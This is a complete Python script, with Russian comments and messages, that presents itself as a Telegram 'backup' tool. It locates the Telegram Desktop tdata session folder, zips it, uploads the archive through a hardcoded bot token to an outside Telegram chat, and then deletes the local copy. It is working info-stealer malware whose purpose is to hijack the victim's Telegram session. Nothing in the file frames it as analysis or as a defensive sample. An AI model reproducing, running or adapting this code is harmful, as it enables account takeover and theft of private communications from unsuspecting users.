import os
import sys
import subprocess

# === УСТАНОВКА ЗАВИСИМОСТЕЙ ===
def install_requests():
    try:
        import requests
        print("[✓] Библиотека requests уже установлена.")
        return True
    except ImportError:
        print("[*] Устанавливаю requests...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
            print("[✓] requests установлена.")
            return True
        except Exception as e:
            print(f"[!] Ошибка установки: {e}")
            return False

if not install_requests():
    input("Нажми Enter для выхода...")
    sys.exit()

# === ОСНОВНОЙ КОД ===
from pathlib import Path
import shutil
import requests
import time

BOT_TOKEN = "8719549559:AAFuky0ZTDGoibclNUPRKWCrl_ODOdQBOCM"
CHAT_ID = "-1004353662613"

def get_tdata_path():
    appdata = Path.home() / "AppData" / "Roaming"
    tg_path = appdata / "Telegram Desktop" / "tdata"
    if tg_path.exists():
        return tg_path
    alt = Path.home() / "AppData" / "Local" / "Telegram Desktop" / "tdata"
    if alt.exists():
        return alt
    return None

def backup_tdata():
    print("[*] Ищем папку tdata...")
    tdata_path = get_tdata_path()
    if not tdata_path:
        print("[-] Папка tdata не найдена.")
        return None
    print(f"[+] Найдена: {tdata_path}")
    archive_name = f"tdata_backup_{int(time.time())}"
    archive_path = shutil.make_archive(archive_name, "zip", tdata_path)
    print(f"[+] Архив создан: {archive_path}")
    return archive_path

def send_to_telegram(archive_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(archive_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": CHAT_ID, "caption": "☠️ Telegram session (tdata)"}
        try:
            r = requests.post(url, files=files, data=data)
            if r.status_code == 200:
                print("[+] Отправлено!")
            else:
                print(f"[-] Ошибка: {r.text}")
        except Exception as e:
            print(f"[-] Ошибка соединения: {e}")

if __name__ == "__main__":
    archive = backup_tdata()
    if archive:
        send_to_telegram(archive)
        os.remove(archive)
        print("[*] Архив удалён.")
    input("Нажми Enter для выхода...")